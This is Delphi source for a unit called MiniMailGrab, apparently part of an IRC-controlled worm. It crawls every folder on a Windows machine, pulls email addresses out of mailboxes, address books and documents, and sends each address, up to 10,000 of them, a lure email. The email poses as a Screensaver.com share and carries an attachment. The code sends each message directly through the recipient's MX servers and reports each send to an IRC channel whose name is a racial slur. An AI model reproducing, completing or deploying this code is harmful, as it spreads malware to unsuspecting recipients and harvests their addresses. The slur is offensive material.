   unit MiniMailGrab;

   interface

   Uses
     Windows, MiniMailFunc, MXResolver, MiniMailBot;

   Type
     TFileName = type string;
     TSearchRec = record
       Time: Integer;
       Size: Integer;
       Attr: Integer;
       Name: TFileName;
       ExcludeAttr: Integer;
       FindHandle: THandle;
       FindData: TWin32FindData;
     end;

     LongRec = packed record
       case Integer of
         0: (Lo, Hi: Word);
         1: (Words: array [0..1] of Word);
         2: (Bytes: array [0..3] of Byte);
     end;

   const
     faReadOnly            = $00000001;
     faHidden              = $00000002;
     faSysFile             = $00000004;
     faVolumeID            = $00000008;
     faDirectory           = $00000010;
     faArchive             = $00000020;
     faAnyFile             = $0000003F;

   procedure doscan(dir, name, mask: string);
   Procedure DoGather(FileName, Filter: String);

   implementation

   function FindMatchingFile(var F: TSearchRec): Integer;
   var
     LocalFileTime: TFileTime;
   begin
     with F do
     begin
       while FindData.dwFileAttributes and ExcludeAttr <> 0 do
         if not FindNextFile(FindHandle, FindData) then
         begin
           Result := GetLastError;
           Exit;
         end;
       FileTimeToLocalFileTime(FindData.ftLastWriteTime, LocalFileTime);
       FileTimeToDosDateTime(LocalFileTime, LongRec(Time).Hi, LongRec(Time).Lo);
       Size := FindData.nFileSizeLow;
       Attr := FindData.dwFileAttributes;
       Name := FindData.cFileName;
     end;
     Result := 0;
   end;

   procedure FindClose(var F: TSearchRec);
   begin
     if F.FindHandle <> INVALID_HANDLE_VALUE then
     begin
       Windows.FindClose(F.FindHandle);
       F.FindHandle := INVALID_HANDLE_VALUE;
     end;
   end;

   function FindFirst(const Path: string; Attr: Integer;
     var  F: TSearchRec): Integer;
   const
     faSpecial = faHidden or faSysFile or faVolumeID or faDirectory;
   begin
     F.ExcludeAttr := not Attr and faSpecial;
     F.FindHandle := FindFirstFile(PChar(Path), F.FindData);
     if F.FindHandle <> INVALID_HANDLE_VALUE then
     begin
       Result := FindMatchingFile(F);
       if Result <> 0 then FindClose(F);
     end else
       Result := GetLastError;
   end;

   function FindNext(var F: TSearchRec): Integer;
   begin
     if FindNextFile(F.FindHandle, F.FindData) then
       Result := FindMatchingFile(F) else
       Result := GetLastError;
   end;

   procedure doscan(dir, name, mask: string);
   var
     Sr: TSearchRec;
   begin
     if dir[length(dir)] <> '\' then dir := dir + '\';
     If FindFirst(dir + '*.*', faDirectory, sr) = 0 Then
     Repeat
       If ((Sr.Attr and faDirectory) = faDirectory) and (sr.Name[1] <> '.') then
         doscan(dir + sr.Name, '*', '*.*')
       Else
         DoGather(dir+sr.Name, 'abcabdabxadbadeadpadraeroaspbakbascfgcgiclscmscomcoopcsvctldbxdhtmdocdspdswedu'+
                           'emlfdbfrmgovhlpimbimhimminboxinfoinijspldbldiflogmbxmdamdbmdrmdwmdxmhtmmfmsgmuseum'+
                           'nabnamenchnetnfonsfnwsodsoftorgphpplpmrpptpropstrtfshtmlslkslnstmtbbtxtuinvapvbvcfwab'+
                           'wshxhtmlxlsxml');
     Until (FindNext(Sr) <> 0);
     FindClose(SR);
   end;

   Procedure DoGather(FileName, Filter: String);
   Var
     I           :Integer;
     FileExt     :String;
     Dir         :String;
     Tmp         :String;
     Line        :String;
     Ch          :String;
     Tmp1,Tmp2   :String;
     Tmp3        :String;
     F           :TextFile;
     FileSize    :Integer;
     J         :Integer;
     Count       :Integer;

     body, subject, from, recipt, contenttype, boundray, smtp: string;
     SMTPs: TMXResolver;
   Begin
     Count  := 0;
     dir := extractfilepath(filename);
       If FileName <> '' Then
         Begin
           FileSize := GetFileSize(FileName);
           If FileSize <= (1024 * 100) Then
           Begin
             FileExt := ExtractFileExt(FileName);
             If Pos(LowerCase(FileExt),LowerCase(Filter)) > 0 Then
             Begin
               Tmp3 := Dir+'tmp_'+ExtractFileName(FileName);
               If (CopyFile(pChar(FileName), pChar(Tmp3), False)) and (copy(tmp3,1,4) <> 'tmp_') Then
               Begin
                 FileName := Dir+'tmp_'+ExtractFileName(FileName);
                 AssignFile(F, FileName);
                 Reset(F);
                 Read(F, Tmp);
                 Line := Tmp;
                 ReadLn(F, Tmp);
                 While Not Eof(F) Do
                 Begin
                   Read(F, Tmp);
                   Line := Line + Tmp;
                   ReadLn(F, Tmp);
                 End;
                 CloseFile(F);
                 If DeleteFile(pChar(FileName)) Then
                 Begin
                   If Pos('@', Line) > 0 Then
                   Begin
                     Tmp1 := '';
                     Tmp2 := '';
                     Ch := '';
                     For J := 1 To Length(Line) Do
                     Begin
                       Ch := Line[j];
                       If Pos(LowerCase(Ch), 'abcdefghijklmnopqrstuvwxyz-_0123456789@.') > 0 Then
                       Begin
                         Tmp1 := Tmp1 + Ch;
                       End Else
                       Begin
                         If Pos('@', Tmp1)>0 Then
                         Begin
                           If Count < 10000 Then
                           Begin
                             If (Tmp1 <> '@') And
                                (Tmp1[1] <> '@') And
                                (Tmp1[Length(Tmp1)] <> '@') And
                                (Pos('.', Tmp1) > 0) Then
                             Begin
                               Subject := 'screenshot_id Screensaver';
                               From := 'Service@Screensaver.com';
                               Recipt := Tmp1;
                               ContentType := 'audio/x-wav';
                               Boundray := 'screensaver';
   Body := #13#10+
   'Greetings '+Recipt+'!'#13#10+
   ''#13#10+
   'Someone wants to share a screensaver with'#13#10+
   'you called, "screenshot_id"'#13#10+
   ''#13#10+
   'You can download it directly from Screensaver.com'#13#10+
   'at link below, or download the attached file:'#13#10+
   ''#13#10+
   'screenshot_url'#13#10+
   ''#13#10+
   'Enjoy!'#13#10+
   ''#13#10+
   'The Screensaver.com Team'#13#10;
                               SMTPs := TMXResolver.Create(copy(tmp1, pos('@', tmp1)+1, length(tmp1)));
                               If smtps.ListOfSMTPServers.Count > 0 then
                                 For I := 0 To smtps.ListOfSMTPServers.Count-1 Do
                                   If SendMail(Body, Subject, From, Recipt, ContentType, Boundray, SmtpS.ListOfSMTPServers.Strings(i), 25) Then
                                   Begin
                                     If Not Bot_Silence Then
                                       SendData('PRIVMSG ##niggah :Sent Mail to '+Tmp1+' using ('+SmtpS.ListOfSMTPServers.Strings(i)+')'#10);
                                   ENd;
                             End;
                           End;
                         Tmp1 := '';
                       End Else
                         Tmp1 := '';
                       End;
                     End;
                   End;
                 End;
               End;
             End;
           End;
         End;
   End;

   end.
